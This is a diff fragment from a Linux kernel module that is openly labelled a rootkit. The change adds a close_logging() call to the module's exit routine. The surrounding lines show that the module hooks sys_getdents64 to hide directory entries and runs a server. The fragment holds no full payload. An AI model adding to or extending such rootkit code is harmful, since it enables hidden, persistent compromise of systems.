@@ -23,6 +23,7 @@ static void __exit ModuleExit(void) {
 	remove_hook(&sys_getdents64); //removes sys_getdents64 hook
 	log("[rootkit] module removed!!!\n");
 	remove_server();
+	close_logging();
 	printk(KERN_DEBUG "[rootkit] removed\n"); //DEBUG
 }
 
